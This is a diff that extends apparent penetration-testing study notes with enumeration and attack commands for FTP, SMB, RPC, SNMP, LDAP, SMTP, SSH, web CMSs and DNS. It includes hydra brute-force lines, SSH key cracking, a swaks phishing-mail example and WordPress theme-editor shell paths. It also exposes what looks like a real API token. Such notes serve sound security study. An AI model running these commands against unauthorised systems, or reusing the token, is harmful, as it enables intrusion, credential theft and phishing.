@@ -15,7 +15,26 @@
 ---
 
 ### **1.1. Penetration Testing on FTP**
+FTP enumeration
+```bash
+ftp <IP>
+#login if you have relevant creds or based on nmap scan find out whether this has an anonymous login or not, then login with Anonymous:password
 
+put <file> #uploading file
+get <file> #downloading file
+
+#NSE
+locate .nse | grep ftp
+nmap -p21 --script=<name> <IP>
+
+#bruteforce
+hydra -L users.txt -P passwords.txt <IP> ftp #'-L' for usernames list, '-l' for username and vice versa
+
+# Check for vulnerabilities associated with the identified version.
+```
+![image](https://github.com/user-attachments/assets/70094f78-e27a-446e-a97f-6eb39cff347c)
+
+---
 ### **1.1.1. Anonymous Login**
 
 When performing penetration testing, an attacker can attempt to log in using **anonymous credentials** if the FTP server allows it. Many misconfigured FTP servers allow anonymous access for easier file sharing, which is a security risk.
@@ -230,6 +249,8 @@ SMB is a protocol used for file and printer sharing, as well as inter-process co
 ```bash
 
 sudo nmap -p 445 -sV -sC 192.168.188.131
+locate .nse | grep smb
+nmap -p445 --script="name" $IP 
 
 ```
 ![image](https://github.com/user-attachments/assets/5f4b1ffc-baab-4de5-9c0f-dcb520401b1c)
@@ -238,11 +259,13 @@ sudo nmap -p 445 -sV -sC 192.168.188.131
 **Enumerating SMB Shares:**
 
 ```bash
+#In windows we can view like this
+net view \\<computername/IP> /all
 
 enum4linux -L -S 192.168.188.131
 smbclient -L 192.168.188.131 -N
 smbmap -H 192.168.188.131
-If you got user name and password:
+#If you got user name and password:
 smbmap -H 192.168.188.131 -u "msfadmin" -p "msfadmin" -r tmp -A '.*' -q
 
 ```
@@ -257,7 +280,30 @@ netexec smb 192.168.188.131 -u admin -p /home/kali/pass.txt --continue-on-succes
 
 ```
 ![image](https://github.com/user-attachments/assets/c592d34d-613f-49b5-9a92-c3b8c951958a)
+```bash
+# Smbclient
+smbclient -L //IP #or try with 4 /'s
+smbclient //server/share
+smbclient //server/share -U <username>
+smbclient //server/share -U domain/username
 
+#SMBmap
+smbmap -H <target_ip>
+smbmap -H <target_ip> -u <username> -p <password>
+smbmap -H <target_ip> -u <username> -p <password> -d <domain>
+smbmap -H <target_ip> -u <username> -p <password> -r <share_name>
+
+#Within SMB session
+put <file> #to upload file
+get <file> #to download file
+```
+Downloading shares is easy—if the folder consists of several files, they will all be downloaded by this.
+```bash
+mask ""
+recurse ON
+prompt OFF
+mget *
+```
 **Exploit SMB:**
 Try to connect with no pass
 
@@ -302,8 +348,23 @@ RPC allows a program on one computer to execute a procedure on another computer.
 ```bash
 
 $ rpcclient -U "" -N <target>
-$> srvinfo
-$> enumdomusers
+srvinfo
+enumdomusers #Enumerate Domain Users
+enumpriv #like "whoami /priv"
+queryuser <user> #detailed user info
+getuserdompwinfo <RID> #password policy, get user-RID from previous command
+getdompwinfo #Get Domain Password Info
+lookupnames <user> #SID of specified user
+createdomuser <username> #Creating a user
+deletedomuser <username>
+enumdomains
+enumdomgroups # Enumerate Domain Groups
+querygroup <group-RID> #get rid from previous command
+querydispinfo #description of all users
+querygroupmem 0x200 #Query Group Membership
+netshareenum #Share enumeration, this only comesup if the current user we're logged in has permissions
+netshareenumall
+lsaenumsid #SID of all users
 
 ```
 
@@ -314,71 +375,6 @@ This will provide information about the target system and its users.
 
 Query Domain information:
 ![image](https://github.com/user-attachments/assets/d3e9af35-e0b2-4c72-b893-e7a24141b82a)
-
-
-**Enumerate Domain Users**
-
-```
-rpcclient $> enumdomusers
-user: [Administrator] rid:[0x1f4]
-...
-
-```
-
-**Enumerate Domain Groups**
-
-```
-rpcclient $> enumdomgroups
-group: [Domain Admins] rid:[0x200]
-...
-
-```
-
-**Query Group Information**
-
-```
-rpcclient $> querygroup 0x200
-Group Name:     Domain Admins
-...
-
-```
-
-**Query Group Membership**
-
-```
-rpcclient $> querygroupmem 0x200
-rid:[0x1f4]   attr:[0x7]
-...
-
-```
-
-**Query Specific User Information by RID**
-
-```
-rpcclient $> queryuser 0x1f4
-User name   :   Administrator
-...
-
-```
-
-**Get Domain Password Info**
-
-```
-rpcclient $> getdompwinfo
-min_password_length: 11
-password_properties: 0x00000000
-
-```
-
-**Get Domain User Password Info**
-
-```
-rpcclient $> getusrdompwinfo 0x1f4
-min_password_length: 11
-    &info.password_properties: 0x4b58bb34 (1264106292)
-    ...
-
-```
 
 **Password Spray Attack**
 
@@ -414,6 +410,22 @@ SNMP is used to manage and monitor network devices. It can be exploited if the c
 ```bash
 
 snmpcheck -c public -h 192.168.188.131
+snmpcheck -t <IP> -c public #Better version than snmpwalk as it displays more user friendly
+
+snmpwalk -c public -v1 -t 10 <IP> #Displays entire MIB tree, MIB Means Management Information Base
+snmpwalk -c public -v1 <IP> 1.3.6.1.4.1.77.1.2.25 #Windows User enumeration
+snmpwalk -c public -v1 <IP> 1.3.6.1.2.1.25.4.2.1.2 #Windows Processes enumeration
+snmpwalk -c public -v1 <IP> 1.3.6.1.2.1.25.6.3.1.2 #Installed software enumeraion
+snmpwalk -c public -v1 <IP> 1.3.6.1.2.1.6.13.1.3 #Opened TCP Ports
+
+#Windows MIB values
+1.3.6.1.2.1.25.1.6.0 - System Processes
+1.3.6.1.2.1.25.4.2.1.2 - Running Programs
+1.3.6.1.2.1.25.4.2.1.4 - Processes Path
+1.3.6.1.2.1.25.2.3.1.4 - Storage Units
+1.3.6.1.2.1.25.6.3.1.2 - Software Name
+1.3.6.1.4.1.77.1.2.25 - User Accounts
+1.3.6.1.2.1.6.13.1.3 - TCP Local Ports
 
 ```
 if community string was public try to connect with snmpcheck
@@ -444,6 +456,31 @@ LDAP is a protocol used to access and maintain directory information. It is comm
 ```bash
 
 ldapsearch -x -H ldap://<IP> -b "dc=example,dc=com"
+ldapsearch -x -H ldap://<IP>:<port> # try on both ldap and ldaps, this is first command to run if you dont have any valid credentials.
+
+ldapsearch -x -H ldap://<IP> -D '' -w '' -b "DC=<1_SUBDOMAIN>,DC=<TLD>"
+ldapsearch -x -H ldap://<IP> -D '<DOMAIN>\<username>' -w '<password>' -b "DC=<1_SUBDOMAIN>,DC=<TLD>"
+#CN name describes the info we're collecting
+ldapsearch -x -H ldap://<IP> -D '<DOMAIN>\<username>' -w '<password>' -b "CN=Users,DC=<1_SUBDOMAIN>,DC=<TLD>"
+ldapsearch -x -H ldap://<IP> -D '<DOMAIN>\<username>' -w '<password>' -b "CN=Computers,DC=<1_SUBDOMAIN>,DC=<TLD>"
+ldapsearch -x -H ldap://<IP> -D '<DOMAIN>\<username>' -w '<password>' -b "CN=Domain Admins,CN=Users,DC=<1_SUBDOMAIN>,DC=<TLD>"
+ldapsearch -x -H ldap://<IP> -D '<DOMAIN>\<username>' -w '<password>' -b "CN=Domain Users,CN=Users,DC=<1_SUBDOMAIN>,DC=<TLD>"
+ldapsearch -x -H ldap://<IP> -D '<DOMAIN>\<username>' -w '<password>' -b "CN=Enterprise Admins,CN=Users,DC=<1_SUBDOMAIN>,DC=<TLD>"
+ldapsearch -x -H ldap://<IP> -D '<DOMAIN>\<username>' -w '<password>' -b "CN=Administrators,CN=Builtin,DC=<1_SUBDOMAIN>,DC=<TLD>"
+ldapsearch -x -H ldap://<IP> -D '<DOMAIN>\<username>' -w '<password>' -b "CN=Remote Desktop Users,CN=Builtin,DC=<1_SUBDOMAIN>,DC=<TLD>"
+
+#windapsearch.py
+#for computers
+python3 windapsearch.py --dc-ip <IP address> -u <username> -p <password> --computers
+
+#for groups
+python3 windapsearch.py --dc-ip <IP address> -u <username> -p <password> --groups
+
+#for users
+python3 windapsearch.py --dc-ip <IP address> -u <username> -p <password> --da
+
+#for privileged users
+python3 windapsearch.py --dc-ip <IP address> -u <username> -p <password> --privileged-users
 
 ```
 
@@ -470,8 +507,11 @@ SMTP is used for sending and receiving emails. It can be exploited in cases of m
 **Enumerating SMTP:**
 
 ```bash
+nc -nv <IP> 25 #Version Detection
+smtp-user-enum -M VRFY -U username.txt -t <IP> # -M means mode; it can be RCPT, VRFY, EXPN
 
-smtp-user-enum -M VRFY -U usernames.txt -t <IP>
+#Sending email with valid credentials, the below is an example of Phishing mail attack
+sudo swaks -t daniela@beyond.com -t marcus@beyond.com --from john@beyond.com --attach @config.Library-ms --server 192.168.50.242 --body @body.txt --header "Subject: Staging Script" --suppress-data -ap
 
 ```
 
@@ -605,33 +645,26 @@ hydra -l <username> -P /usr/share/wordlists/rockyou.txt -s 110 -vV <IP> pop3
 **Secure Shell (SSH)** is a cryptographic network protocol designed for secure communication over an unsecured network. It is primarily used for remote login and command-line execution, replacing older, less secure protocols like Telnet and rlogin
 https://www.ssh.com/academy/ssh/public-key-authentication
 
-## To create RSA SSH keys, generate a public/private key pair using
+## SSH enumeration
 
 ```
-ssh-keygen
+#Login
+ssh uname@IP #enter the password in the prompt
+
+#id_rsa or id_ecdsa file
+chmod 600 id_rsa/id_ecdsa
+ssh uname@IP -i id_rsa/id_ecdsa #if it still asks for the password, crack it using John
+
+#cracking id_rsa or id_ecdsa
+ssh2john id_ecdsa(or)id_rsa > hash
+john --wordlist=/home/sathvik/Wordlists/rockyou.txt hash
+
+#bruteforce
+hydra -l uname -P passwords.txt <IP> ssh #'-L' for usernames list, '-l' for username and vice versa
+
+# Check for vulnerabilities associated with the identified version.
 ```
-
-, copy the public key to the server's
-
-```
-~/.ssh/authorized_keys
-```
-
-file, and then log in using the private key.
-
-Here's a step-by-step guide:
-
-**1. Generate the SSH Key Pair:**
-
-- **Open your terminal**: on your local machine.
-- Run the `ssh-keygen` command:
-
-Code
-
-```jsx
-    ssh-keygen -t rsa -b 4096
-```
-
+Use full commands:
 - `t rsa`: Specifies the RSA algorithm.
 - `b 4096`: Specifies the key length (4096 bits is recommended).
 - You can also use `b 2048` for a shorter key length.
@@ -677,4 +710,102 @@ Code
   ssh -i ~/.ssh/id_rsa user@server_ip_or_hostname
   ssh -oHostKeyAlgorithms=+ssh-rsa TCM@10.10.81.58 -p22
   ```
+  ![image](https://github.com/user-attachments/assets/bdb18c28-6296-4013-bd28-4d6edafd81e9)
+
   ---
+**10. HTTP/S enumeration**
+
+- View the source code and identify any hidden content. If an image looks suspicious, download it and try to find hidden data in it.
+- Identify the version or CMS and check for active exploits. This can be done using Nmap and Wappalyzer.
+- check /robots.txt folder
+- Look for the hostname and add the relevant one to `/etc/hosts` file.
+- Directory and file discovery - Obtain any hidden files that may contain juicy information
+
+```
+dirbuster
+gobuster dir -u http://example.com -w /path/to/wordlist.txt
+python3 dirsearch.py -u http://example.com -w /path/to/wordlist.txt
+```
+
+- Vulnerability Scanning using nikto: `nikto -h <url>`
+- `HTTPS`SSL certificate inspection, may reveal information like subdomains, usernames…etc
+- Default credentials: Identify the CMS or service, check for default credentials, and test them out.
+- Bruteforce
+
+```
+hydra -L users.txt -P password.txt <IP or domain> http-{post/get}-form "/path:name=^USER^&password=^PASS^&enter=Sign+in:Login name or password is incorrect" -V
+# Use https-post-form mode for https, post, or get, which can be obtained from Burpsuite. Also, capture the response for detailed information.
+
+#Bruteforce can also be done by Burpsuite but it's slow, prefer Hydra!
+```
+
+- if `cgi-bin` is present, then do further fuzzing and obtain files like .sh or .pl
+- Check if other services like FTP/SMB or any other that has upload privileges are getting reflected on the web.
+- API - Fuzz further, and it can reveal some sensitive information
+
+```
+#identifying endpoints using gobuster
+gobuster dir -u http://192.168.50.16:5002 -w /usr/share/wordlists/dirb/big.txt -p pattern #pattern can be like {GOBUSTER}/v1 here v1 is just for example, it can be anything
+
+#obtaining info using curl
+curl -i http://192.168.50.16:5002/users/v1
+```
+
+- If there is any Input field check for **Remote Code execution** or **SQL Injection**
+- Check the URL, whether we can leverage **Local or Remote File Inclusion**.
+- Also check if there’s any file upload utility(also obtain the location it’s getting reflected)
+
+**Wordpress**
+
+```
+# basic usage
+wpscan --url "target" --verbose
+
+# enumerate vulnerable plugins, users, vulnerable themes, timthumbs
+wpscan --url "target" --enumerate vp,u,vt,tt --follow-redirection --verbose --log target.log
+
+# Add Wpscan API to get the details of vulnerabilties.
+wpscan --url http://alvida-eatery.org/ --api-token NjnoSGZkuWDve0fDjmmnUNb1ZnkRw6J2J1FvBsVLPkA
+
+#Accessing Wordpress shell
+http://10.10.67.245/retro/wp-admin/theme-editor.php?file=404.php&theme=90s-retro
+
+http://10.10.67.245/retro/wp-content/themes/90s-retro/404.php
+```
+
+**Drupal**
+
+```
+droopescan scan drupal -u http://site
+```
+
+**Joomla**
+
+```
+droopescan scan joomla --url http://site
+sudo python3 joomla-brute.py -u http://site/ -w passwords.txt -usr username #https://github.com/ajnik/joomla-bruteforce
+```
+--
+**11. DNS enumeration**
+
+- Better use `Seclists` wordlists for better enumeration. https://github.com/danielmiessler/SecLists/tree/master/Discovery/DNS
+
+```
+host www.megacorpone.com
+host -t mx megacorpone.com
+host -t txt megacorpone.com
+
+for ip in $(cat list.txt); do host $ip.megacorpone.com; done #DNS Bruteforce
+for ip in $(seq 200 254); do host 51.222.169.$ip; done | grep -v "not found" #bash bruteforcer to find domain name
+
+## DNS Recon
+dnsrecon -d megacorpone.com -t std #standard recon
+dnsrecon -d megacorpone.com -D ~/list.txt -t brt #bruteforce, hence we provided list
+
+# DNS Bruteforce using dnsenum
+dnsenum megacorpone.com
+
+## NSlookup, a gold mine
+nslookup mail.megacorptwo.com
+nslookup -type=TXT info.megacorptwo.com 192.168.50.151 #We are querying the information from a specific IP, here it is 192.168.50.151. This can be very useful
+```
